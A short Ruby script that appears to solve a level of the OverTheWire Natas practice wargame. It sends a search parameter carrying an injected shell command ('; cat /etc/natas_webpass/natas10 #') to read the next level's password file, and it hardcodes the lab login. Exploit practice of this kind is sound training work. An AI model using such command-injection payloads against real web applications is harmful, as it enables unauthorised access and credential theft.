#!/usr/bin/ruby
require "net/http"

username = "natas9"
password = "W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl"

url = URI.parse "http://%s.natas.labs.overthewire.org/?needle=%s&submit=Search" % [username, URI.encode("; cat /etc/natas_webpass/natas10 #")]
client = Net::HTTP.new url.host, url.port

req = Net::HTTP::Get.new url
req.basic_auth username, password

print (client.request req).body